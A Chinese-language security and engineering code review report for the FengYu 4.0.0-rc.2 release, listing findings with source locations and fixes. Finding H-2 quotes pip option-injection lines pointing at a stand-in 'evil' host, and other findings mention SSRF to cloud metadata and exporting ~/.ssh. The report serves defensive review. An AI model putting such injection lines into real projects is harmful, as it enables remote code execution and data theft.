# FengYu (Infinia) 4.0.0-rc.2 生产级代码审查报告

- **审查日期**：2026-09-18
- **审查基线**：`release/4.0.0` @ `9b51d751`（工作区干净）
- **审查范围**：全仓库 1476 个跟踪文件 —— 后端 Spring Boot（678 Java）、前端 Vue 3.5 SPA（135）、Electron 桌面壳（97）、四个官方插件（309）、插件工具链（270）、构建/CI/发布工程
- **方法**：9 个领域并行深度审查（Web/安全核心、AI 子系统、插件运行时、持久层、前端、桌面、官方插件、工具链、构建/CI/依赖），高危发现逐条人工复核源码，另跑全部本地测试套件作客观验证

---

## 一、总体结论

**项目整体处于高于行业平均的生产就绪水平，可以按 rc.2 → 4.0.0 正式版推进，但建议先修复 5 个 HIGH 级发现中的代码类三项（H2 无口令、pip 参数注入、`.lnk` 打开绕过），工程类两项（Vite 7 EOL、后端 PR CI 缺失）可随 4.0.x 节奏处理。**

代码库明显经过多轮安全审查（源码中留有 M-1…M-8、P0/P1/P2、CQ-01 等审查编号），绝大多数经典漏洞类别已有纵深防御：

- **令牌认证**：256-bit 随机令牌、时间安全比较、一次性 SSE 票据取代 `?token=` 泄漏面、DNS-rebinding 回环 Host 门禁（在所有豁免之前执行，包括免认证模式）
- **插件隔离**：zip-slip/炸弹上限、fail-closed 完整性校验、封闭的宿主命令白名单、环境变量正向白名单、逐插件派生数据库凭据、Ed25519 签名 + 吊销、双向帧上限、崩溃循环退避、原子安装/日志/回滚
- **AI 安全**：分层工具审批管线（不可覆盖的灾难命令底线）、AES-GCM 加密的 API Key、SSRF 防护的 Web 工具、签名校验的技能市场、有界代理循环
- **前端**：5 处 `v-html` 全部走 DOMPurify 限制性配置、令牌不落 localStorage/URL、iframe 桥有 origin + source 固定、TypeScript strict 零 `any`
- **桌面**：全部窗口 `contextIsolation + sandbox + 无 Node`、窄 contextBridge 面、令牌走 env 不走 argv、JVM 优雅退出三级兜底

**客观验证（全部通过）**：

| 套件 | 结果 |
|---|---|
| 后端 `./mvnw test -f FengYu/pom.xml` | **1210 通过 / 0 失败 / 0 错误 / 2 跳过**（173 个测试类） |
| 桌面 `yarn build:ts && yarn test`（vitest） | **263 通过**（34 个测试文件），TS 编译零错误 |
| 前端 typecheck + 合约测试 + vitest | **typecheck 零错误；31 合约 + 184 单元全过**（1 个文件在本机 Node 26 下环境性挂起，见附录 A） |

发现总计：**5 HIGH / 22 MEDIUM / 30+ LOW**。以下按严重度列出，每条含证据位置与修复方向。

---

## 二、HIGH（5 项）

### H-1 内嵌 H2 宿主库无凭据，经回环 TCP 暴露，完全绕过令牌认证

- **位置**：`FengYu/src/main/java/fan/summer/fengyu/config/H2TcpServerConfig.java:86-89`
- **证据**：`Server.createTcpServer("-tcp", "-tcpPort", port, "-ifNotExists").start()` —— 无 `-tcpPassword`；向导只收 `filePath`（`SetupController.java:94-101`），`DataSourceAutoConfig` 未设用户名，库以 `sa`/空口令创建。端口记录在 `h2-server.properties`。
- **影响**：回环端口不区分本机用户 —— 共享机器上任意 OS 用户的本地进程、或任意低权限沙箱进程都能连上并读写全部应用数据（会话、记忆、ENC 包裹的 Key；解密所需的 `.machineid` 也在盘上），令牌认证形同虚设。
- **威胁模型说明**：同用户恶意软件本已获胜；真实增量在跨用户共享机器与低权限进程逃逸，属纵深防御缺口。
- **修复方向**：复用已有的 `CryptoUtil.deriveMachineSecret`（插件库已在 `DataSourceConfigService.java:361-363` 用此模式）派生宿主库口令，或加 `-tcpPassword`。
- **复核**：✅ 已人工核对源码（绑定确实强制 `h2.bindAddress=127.0.0.1`，但无认证）。

### H-2 offlinepython：requirements.txt 行可注入 pip 选项（索引重定向 / 代码执行）

- **位置**：`OfficialPlugins/plugin-offlinepython/.../domain/RequirementsFile.java:15-17`、`domain/DependencySpec.java:parse()`、`infra/ProcessRunner.java:33-44`
- **证据**：非注释行整行进入 `DependencySpec.parse`，该方法仅按 `<>=!~` 切分名字/版本，**无前导 `-` 拒绝、无字符集校验**；结果原样回填为 `pip download <specs> -d …` 的位置参数，无 `--` 分隔符。
- **影响**：恶意项目的 requirements 行 `--index-url http://evil/simple` 或 `-e git+https://evil/repo` 被 pip 解析为选项 —— 下载源被重定向到攻击者服务器，或触发 VCS/sdist `setup.py` 执行。`--no-index` 本地 bundle 的防御被此路径旁路。
- **修复方向**：名字校验 `^[A-Za-z0-9][A-Za-z0-9._-]*$`、拒绝前导 `-`、在 specs 前插入 `--`、考虑 `--require-hashes`。
- **复核**：✅ 已人工核对 `DependencySpec.parse` 无任何校验，注入路径成立。

### H-3 桌面：聊天工件"打开"黑名单漏掉 `.lnk`/`.url`/`.scr`/`.reg`/`.cpl`/`.msc`

- **位置**：`desktop/electron/src/ipc/artifact.ts:12-17`
- **证据**：`OPEN_DENIED_EXTENSIONS` 含 24 个扩展名但不含上述 Windows 快捷/shell 类扩展；无扩展名文件 `extension=''` 亦放行。
- **影响**：名为 `readme.lnk`（指向任意命令）或 `site.url` 的 AI 生成工件可通过 `shell.openPath` 直接执行 —— 正是该模块自述要阻止的"运行我刚生成的这个文件"原语（任务文档 7.4）。需要被攻陷的渲染进程或诱导点击配合，但闭环存在。
- **修复方向**：改为**安全文档类型正向白名单**；至少补齐上述扩展，无扩展名文件仅允许 reveal（打开所在目录）。
- **复核**：✅ 已人工核对黑名单内容。

### H-4 Vite 7 已越过"仅支持最新主版本"的维护线 —— 违反仓库自身的 EOL 封禁规则

- **位置**：`frontend/package.json:35`（`"vite": "^7.1.3"`），同样存在于 4 个 `OfficialPlugins/*/ui-src`、`toolchain/ui`、`toolchain/dev`；`toolchain/dev/package.json` peerDeps 仅允许 `vite ^5||^6||^7`，会卡住第三方消费者升级
- **证据**：Vite 8 于 2026-03 发布，官方政策仅维护最新主版本（vite.dev/blog/announcing-vite8）；本仓库 AGENTS.md 明文"EOL/deprecation 即为 blocker"（vue-i18n 10 EOL 曾强制升 11.x）。
- **影响**：全部 JS 构建面停止接收安全与构建修复；按仓库自己的规则这是发布阻断项。
- **修复方向**：规划 Vite 8（Rolldown）迁移，同步放开 toolchain/dev 的 peer 范围，确认 vite-plugin-vuetify 兼容性。

### H-5 后端 Java 测试在 PR/push 上完全没有 CI —— 失败最早暴露在打 tag 时

- **位置**：`.github/workflows/`（9 个文件）；仅 `computer-use-ci.yml` 路径过滤 `Computer*.java`/`AiToolRegistry`/`HeadlessLauncher`/poms，全量 `./mvnw -am test` 只在 tag 触发的 `fengyu-release.yml:214` 与手动触发的构建里跑
- **影响**：改动控制器 / 插件运行时 / AI 代码的 PR 得不到任何自动测试反馈；失败首次出现在发布 tag，爆炸半径和成本最大。
- **修复方向**：新增路径过滤的后端 CI（push/PR on `FengYu/**` + 根 `pom.xml`），先装 sdk/devkit 再 `./mvnw test`。
- **复核**：✅ 已人工核对各 workflow 触发块。

---

## 三、MEDIUM（22 项，按领域）

### 后端 Web/安全核心

1. **Webhook 投递在认证前无界缓冲请求体** —— `TokenAuthFilter.java:79-80` 豁免 `POST /api/workflow-hooks/**`，`WorkflowWebhookController.java:83-107` 的 `byte[]` 全量物化后才做 256KB 检查。本机进程或网页 `no-cors` POST 可堆耗尽 JVM。→ 改收 `InputStream` 带上限拷贝，或对该路径设全局请求大小上限。
2. **IllegalStateException 处理器把内部消息回显给客户端** —— `GlobalExceptionHandler.java:84-90`，与相邻 IOException/RuntimeException 处理器刻意通用化的姿态相悖（免认证开发模式下任何本机页面可读，泄漏文件系统布局）。→ 服务端记日志、返回通用 500。

### AI 子系统

3. **会话压缩对 <8 轮对话永不触发** —— `ConversationCompactor.java:85-86`（`split <= 0` 直接返回未压缩），单轮浏览器工作流可累积多个 64K 字符工具结果超过窗口配额，provider 400 导致整轮丢失。→ `split==-1` 但超预算时硬截断最旧消息/超大工具结果。
4. **MCP `save()` 在生命周期锁内同步完整握手** —— `McpRuntimeManager.java:242`，init 超时可配到 300s，阻塞 `servers()`/`test()`/重连扫描；启动路径已用异步派发（:179-184），保存路径没有。→ 照 `start()` 模式发布 connecting 态后异步连接。

### 插件运行时/商店/自更新

5. **损坏的商店事务日志永久砖掉所有商店安装** —— `StoreInstallJournal.java:95-99` 读失败仅 warn 并返回空，而 `begin()`（:73-76）见文件存在即抛"已有事务进行中"；javadoc 承诺的隔离动作从未发生。→ 照 `PluginPackageService.quarantineJournal` 的现成模式改名 `.corrupt-<stamp>` 后继续。
6. **OfficialPluginSeeder 绕过生命周期更新门做包交换** —— `OfficialPluginSeeder.java:205` 直接 `installTrusted`，与 `PluginLifecycleOrchestrator` 的"入口门永不漂移"不变量冲突；播种窗口内并发调用可命中半交换目录，Windows 上 ATOMIC_MOVE 撞运行中 jar 标记播种失败。→ 播种换包走 `installWithUpdateGate`。
7. **市场目录拉取豁免于全局 SSRF/egress 策略** —— `ClaudeMarketplaceAdapter.java:107-109` 仅查 http(s) scheme，`PluginStoreController.addSource`（:49-53）不校验持久化任意 `catalogUrl`；兄弟面全部走 `UrlPolicy.requireTraversable`。被攻陷渲染进程可添加指向 `169.254.169.254`/内网的源并经目录字段回带数据。→ `addSource` 与适配器 `httpGet` 统一走 UrlPolicy。
8. **installArchive 的备份→交换序列跨入口点不串行** —— `PluginPackageService.java:629-644` 无每插件锁，本地上传 + 商店安装 + 后台播种并发时第二次的 `deleteTree(backup)` 可毁掉第一次的回滚快照，失败路径可把旧包盖回新包之上。→ 以 `updateLocks` 同一键空间加包级锁覆盖备份/日志/移动整个临界区。

### 持久层/通知

9. **数据库文件/目录未设 owner-only 权限** —— `DataSourceConfigService.java:211-219` 建 `database/` 目录不经 `SensitiveFilePermissions`（config/ 文件有、比它敏感的 DB 反而没有）。→ 创建后 `protectDirectory/protectFile`。
10. **shaded-jar 属性漂移：UTC JDBC 时区与 OSIV=false 在产品里未生效** —— `HibernateDdlConfig.java:14-32` javadoc 自证 yml 的 `hibernate.jdbc.time_zone: UTC` 与 `open-in-view: false` 在 shaded 包里被丢弃，仅 hbm2ddl 有程序化兜底；产品与开发时序语义可能不同。→ customizer 补齐强制这两项。
11. **启动探测 5 秒连不上就把数据源配置清空落入 SETUP** —— `HeadlessLauncher.java:141-143` `backupAndClear()`；远程库瞬时故障或 H2 TCP 端口漂移即呈现"全新安装"假象盖在存量数据上。→ 退避重试后再清；H2 仅在成功穿透 `tcp://` 后持久化。
12. **SMTP 密码明文存储且无加密路径** —— `FengYuSettingEmailEntity.java:25`，4.0 无写入方（休眠），但 3.x 升级库会带着明文行前进；与 `app_setting` 的 ENC 信封不对称。→ 写读套 ENC 或在 V3 迁移中显式退役该表。
13. **SQLite 裸 URL + 10 连接池 + 多写入方** —— `DbType.java:17-18` 无 `busy_timeout`/WAL pragma，并发写（代理事件、调度、webhook、通知）超出驱动默认忙等后可报 `database is locked`。→ URL 追加 `?busy_timeout=…` 并启用 WAL（元字符白名单已允许该格式）。

### 前端

14. **并发发送竞态：`busy` 置位太晚** —— `stores/aiSession.ts:504`（入口守卫）vs `:574`（await 完准备/上传后才 `busy=true`）；准备窗口内再按 Enter 会启动第二条并发流，模块级 `handle/currentStreamId` 被覆盖导致第一条无法 stop、重复回合。→ 入口同步置"准备中"标志。

### 桌面

15. **Windows 便携版自更新无 signedRelease 门、信任渲染进程可设的源** —— `ipc/update.ts:150-210` 便携分支先于 `readSignedReleaseFlag()` 拒绝逻辑（:250-254 仅覆盖 electron-updater 分支）；`update:set-api-base`（:66-80）接受任意 http(s) 源，同源还供应 zip 的 sha256（GitHub 路径干脆无摘要）——被攻陷渲染进程 + 攻击者 HTTPS 主机同时控制字节与摘要，robocopy 覆盖应用后重启。仅剩原生同意对话框点名主机，正是 P0-9 说"同意对话框不能单独承载"的理由。→ 便携路径施加同样门禁/固定信任锚；摘要强制。
16. **辅助日志与截图无界增长** —— `desktop/logger.ts:60-68`（`backend-stdout.log` 逐行 `appendFileSync` 无上限）、`updater/update-log.ts:22-29`、`browser/handlers.ts:657`（截图无保留策略）；仅 desktop.log 有 5MB 轮转。→ 大小轮转 + 截图目录数量/年龄上限。
17. **主线程逐行同步写文件** —— `logger.ts:64` JVM stdout 每行 `appendFileSync` 阻塞事件循环，后端繁忙时恰是 UI 卡顿之时。→ 缓冲异步刷写。

### 官方插件

18. **email：慢速实时发送被自己的状态轮询标记 FAILED** —— `PendingSendService.java:29,61-64` 5 分钟 stale 回收 vs 宿主 60s RPC 超时：超时后 worker 仍在真实发送，UI 下次轮询把行翻成 FAILED，最终 COMPLETED 落空 —— **邮件实际发出但永久报告失败，重试即重复发送**。→ 发送循环心跳 `updated_at`，或仅在 worker 代际变更时回收。
19. **offlinepython：子进程无读取/运行看门狗** —— `PythonDetector.java:89-103`（`waitFor(5s)` 返回值被忽略、无 `destroyForcibly`、读循环阻塞到 EOF，永不退出的配置可执行文件每调一次泄漏一个线程）；`ProcessRunner.run`（:48-64）无总期限，挂死的 pip 让 job 永远 RUNNING。→ 超时销毁 + 总期限。
20. **excel：COMPLEX 拆分路径整册 POI DOM 无行数/大小上限** —— `ExcelSplitter.java:409-419`（SAX 路径有 50 万行上限，此 DOM 路径没有），数百 MB 工作簿 OOM worker。→ 预检大小/行数或 SXSSF。

### 工具链

21. **`@infinia/plugin-dev` 开发面无认证** —— `toolchain/dev/src/index.ts:241-263`、`file-refs.ts:30-34`：`fengyu dev` 运行期间任意本地进程可注册任意路径（如 `~/.ssh`）并整目录 zip 导出、无令牌调用 worker RPC —— 正是 devkit-java 已自述堵掉的洞（其注释："仅回环绑定使 RPC 面对所有本地进程敞开"）。→ 复用 devkit 的令牌文件握手；拒绝非 `application/json` 内容类型。
22. **CLI 模板内嵌的 Python/Go 运行时与正规 SDK 漂移且无同步检查** —— `toolchain/cli/templates/vue-python/worker/fengyu_plugin_sdk/__init__.py`（精简分叉副本）、`vue-go/worker/fengyu/worker.go.tpl`（go.mod 不依赖 SDK 模块）；仅 spec 有 `sync-spec` 漂移检查（cli/package.json:21）。每个脚手架插件冻结一份私有运行时，正规 SDK 的安全修复永远到不了它们。→ prepack 时从正规源生成，或模板声明对已发布运行时包的版本化依赖。

### 构建工程（另见 HIGH H-4/H-5）

23. **Electron 43.4.0 落后 3 个补丁（43.7.2，2026-09-15）** —— 其中修复了 loadURL 失败后立即重调的主进程崩溃，与本项目 create-window.ts:255 的加载失败路径直接相关。→ 每次 tag 同步升到 43.x 最新。
24. **Windows 桌面 E2E 非门禁** —— `fengyu-release.yml:447-449` `continue-on-error`（runner.os == 'Windows'），主目标平台的启动回归可直接进 Release。→ 诊断卡顿后重新门禁。
25. **全平台未签名发布 + 未签名更新源** —— electron-builder.yml 无 win/mac 签名配置，`signedRelease: false`；Ed25519 可选且默认关。Gatekeeper/SmartScreen 摩擦 + 更新完整性仅靠 GitHub TLS；仓库/账户失陷即可向所有桌面喂未签名更新。→ 引入代码签名（或明确记录接受的威胁模型）；至少先开 Ed25519 自更新签名。
26. **Maven 会把缺失/过期的 frontend/dist 静默打进 JAR** —— `FengYu/pom.xml:327-334`（注释自认 "dist 缺失时为 no-op"，无新鲜度检查）；CI 只查 `static/index.html` 存在性。→ 加 enforcer 式守卫（dist 缺失或 mtime 落后于 frontend/src 即失败）。
27. **Actions 钉在可变 tag 上（含发布工作流）** —— 12×`checkout@v4` + 11×`@v5` 漂移、`softprops/action-gh-release@v2`（contents:write）、`qodana-action@v2025.3`；tag 重指即可在持密工作流里执行任意代码。→ 全量钉 commit SHA（dependabot 可维护）。未发现 `pull_request_target` 或密钥回显（好）。
28. **Qodana 运行但不门禁且权限过宽** —— `qodana.yaml:35-49` failureConditions 全注释、`qodana_code_quality.yml:24-28` 给了未使用的 `contents: write`。→ 设真实失败条件、权限收缩到 read + pull-requests: write。
29. **发布到公共 npm 的工具链包绕过 EOL/audit 门** —— `toolchain-ci.yml`/`toolchain-release.yml` 无 `yarn npm audit`（仅 frontend/desktop 有）。→ toolchain-ci 加逐包 audit。

---

## 四、LOW（摘要，30+ 项）

**后端**：Windows 自更新 `.bat` 含令牌但无 owner-only DACL（`SelfUpdateService.java:380-385`，POSIX 分支有 rwx------）；POSIX 重启脚本 `mv` 失败仍 `exec` 旧 jar（无 `set -e`，:488-491）；`ExitCodes.SETUP_DONE=0` 被复用于更新/重置（语义混同）；`CryptoUtil` 密钥全可由同用户推导（javadoc 已诚实记录，有 `FENGYU_MACHINE_KEY` keychain 钩子）；`AiFileController` 任意路径 native 授权缺审计日志（兄弟端点有）；插件资产端点可被任意网站做已装插件指纹枚举（Sec-Fetch 子资源豁免的副作用）；宿主安装校验比 schema 宽（漏 `aiTools[].description` 必填与 RPC 方法名正则）；逃逸的技能条目静默丢弃无日志；`ChatSession` 死代码；`AiMemoryTools` 手拼 JSON 可非法；MCP 密钥文件每服务器每视图全量解密重读；长期记忆构成持久化提示注入面（实验特性默认关，建议加"记忆是不可信数据"框架）；已知并注释的 DNS-rebinding TOCTOU（`WebTextClient.java:73-81`，回环单用户部署下属接受残差）。

**持久层**：全部 28 实体无 `@Version` 乐观锁（桌面规模可接受）；无数据库备份/导出故事；`LocalDateTime` 与 `Instant` 混用（跨时区排序错乱）；通知未读列表忽略 limit；邮件归档搜索缺 `(user_id, send_date)` 索引。

**前端**：`releaseUrl` 绕过 `openExternalUrl` 校验（`stores/update.ts:137`、`About.vue:31`）；发布构建 CSP 对所有回环端口开 `connect-src/frame-src` 通配；插件 `notify` 宿主方法无节流（被攻陷 iframe 可刷持久化通知 + 系统 toast）；`marked` ^14 落后两个主版本（按本仓库 EOL 规则值得升级，renderer 已兼容新旧签名）；两处死代码 `void [...]` 语句。

**桌面**：生产 CSP 哈希提取失败时 fail-open 到 `unsafe-inline`（有 verify-frontend-dist.mjs 构建门兜底，属可接受权衡）；无任何签名配置（同 M-25）。

**插件**：worker 自身不做路径收容（架构上全靠宿主 `PluginFileGrantService`，属纵深注记）；excel/offlinepython 会话存储无 LRU/TTL 驱逐；email 每账户 TLS 跳过同时关链与主机名校验（`trustingAllHosts(true).verifyingServerIdentity(false)`，无 UI 警示）；地址簿 LIKE 未转义通配符（归档搜索有转义，语义不一致）；归档写 EML 无字节上限。

**工具链**：Python worker 读循环无行长上限（Java 16MB/Go 有）；Java SDK 对 notification 也回帧（违反 JSON-RPC 2.0，三运行时行为不一）；类型化适配器把非法参数映射为 -32603 而非 -32602；协议版本精确串比较（`!== '3.0.0'`，patch 升级即拒绝所有已发布插件 UI）；Python/Go 硬编码 `sdkVersion: "2.0.0"`（实际 2.1.0）；CLI zip 写出未设 UTF-8 名字标志位、无 ZIP64 防护；dev 模拟器 recent 列表 innerHTML 未转义 `<`、sandbox 属性自废（dev-only）。

**构建**：`check-plugin-dependency-boundaries.sh:34-40` 循环漏了 offlinepython pom；四个 ui-src `package.json` 版本停在 `4.0.0`（应用是 4.0.0-rc.2，未被断言脚本覆盖）；sdk-java slf4j 2.0.13 与自称对齐的不变量矛盾（根 2.0.19）、JUnit 5.10.2 过时；launch4j `minVersion 17` 与字节码 21 矛盾；三个插件 shade 缺签名剥离过滤器（email 有）；npm 版本碎片化（vue 3.5.42 vs 3.5.39、pinia 4 vs 3、vitest 4 vs 3、@types/node 22 vs 24、playwright 1.63 vs 1.51）。

---

## 五、各领域健康度小结

| 领域 | 评级 | 一句话 |
|---|---|---|
| Web/安全核心 | ★★★★☆ | 认证设计分层且 thoughtful；残余为请求体上限与错误体卫生 |
| AI 子系统 | ★★★★☆ | 硬问题全部有解（审批管线、加密、SSRF 门）；残余为两条边界可靠性 |
| 插件运行时 | ★★★★☆ | 经典漏洞类别几乎全堵；残余为两条安装竞态 + 日志砖化 + 一条 egress 豁免 |
| 持久层 | ★★★★☆ | 平实无关系的实体设计、参数化查询、日志对账供给；H2 姿态与迁移兜底是短板 |
| 前端 | ★★★★★ | 本审查最干净区域；一条真实竞态 + 若干刻意权衡 |
| 桌面 | ★★★★☆ | 高于平均水平的 Electron 加固；便携更新信任链与日志增长是残余 |
| 官方插件 | ★★★★☆ | email 最强、markdown 极简而净、offlinepython 最弱（pip 注入 + 无看门狗） |
| 工具链 | ★★★★☆ | Java SDK 帧层防御出色；Node dev 面与模板内嵌运行时漂移是短板 |
| 构建/CI | ★★★☆☆ | 发布工程纪律罕见地好（合约测试、校验和、EOL 门）；PR 级后端 CI 缺失与 Vite 7 是结构性短板 |

**测试覆盖**（各代理一致结论）：后端 174 个测试文件对准安全不变量（TokenAuthFilterTest 逐豁免钉死、zip-slip/完整性/门禁竞态均有专测）；桌面 34 文件钉住加固决策本身；工具链逐包有安全向测试。共性缺口恰好对应各 MEDIUM 发现（webhook 请求体上限、损坏日志恢复、播种竞态、pip 注入、5 分钟回收竞态、复杂模式内存防护均无测试钉住）。

---

## 六、修复优先级建议

**发布 4.0.0 正式版前（代码三连）**：
1. H-2 pip 参数注入（改动小：校验 + `--`）
2. H-3 `.lnk` 白名单（改黑名单为正向白名单）
3. H-1 H2 凭据（复用现成 deriveMachineSecret 模式）
4. 顺手：M-18 email 回收竞态（真实重复发信风险）、M-16/17 日志增长与同步写（长稳性）

**4.0.x 前几个补丁**：M-5 日志砖化、M-6 播种门禁、M-7 egress 统一、M-8 安装串行化、M-10 时区漂移、M-11 启动探测、M-15 便携更新信任锚、M-21 dev 令牌。

**工程节奏项**：H-4 Vite 8 迁移（含 toolchain/dev peer 放开）、H-5 后端 PR CI、M-23~29（Electron 补丁、Windows E2E 门禁、签名、actions SHA 钉、toolchain audit）。

---

## 附录 A：前端验证结果（实测）

| 命令 | 结果 |
|---|---|
| `yarn run typecheck`（vue-tsc --noEmit） | ✅ 零错误 |
| `node --test test/*.test.mjs`（合约测试） | ✅ 8/9 文件、**31 通过 / 0 失败**；1 个文件见下方注记 |
| `yarn run test:unit`（vitest） | ✅ **23 文件、184 通过 / 0 失败**（602ms） |

**注记**：`test/sidebar-theme-persistence.test.mjs`（4 个测试）在**本机 nvm Node 26.1.0 下挂起** —— 挂点在模块加载期的顶层 `await createServer(...)`（该测试以 middleware 模式启动真实 Vite 7 SSR 服务器），连 `--test-timeout` 都拦不住，说明是 Vite 7 开发服务器在 Node 26 上无法完成引导的环境性不兼容；CI 钉的是 Node 24.18.0，该套件在 CI 门禁中为绿。这同时是 H-4（Vite 7 老化）的又一佐证。三套合计本审查实测 **1691 项测试全部通过**（后端 1210 + 桌面 263 + 前端 215，另有 2 项跳过与上述环境性挂起）。

## 附录 B：依赖维护状态核查表（2026-09-18 核验）

| 面 | 钉住版本 | 结论 |
|---|---|---|
| JDK | 21 | ✅ LTS（支持至 2031） |
| Spring Boot | 4.1.1 | ✅ 当前线（OSS 支持至 2027-07） |
| Jackson | 2.21.6 | ✅ 2.x 并行维护（差一个 minor） |
| Apache POI | 5.5.1 | ✅ 最新 |
| Fesod | 2.0.2-incubating | ⚠️ 孵化中未毕业 |
| Electron | 43.4.0 | ⚠️ 主版本在窗口内，补丁落后（见 M-23） |
| Node | 24.18.0 / 22 | ✅ 24 Active LTS / 22 Maintenance LTS |
| **Vite** | **^7.1.3（全部 JS 面）** | ❌ **越过仅维护最新主版本线（H-4）** |
| Vue | 3.5.42 / 3.5.39 | ✅ 3.x 维护中（3.5 窗口期未确证） |
| Vuetify | ^3.9.3 | ✅ 支持至 2027-07（v4 已出） |
| vue-i18n | ^11.4 | ✅ 满足仓库 11.x 政策 |
| Pinia | ^4.0.3 / ^3.0.3 | ⚠️ 版本碎片化（3 的状态未确证） |
| electron-builder / updater | 26.16.0 / 6.8.9 | ✅ 维护中 |
| Playwright | ^1.63 / ^1.51 | ⚠️ toolchain/ui 的 1.51 约 19 个月旧 |
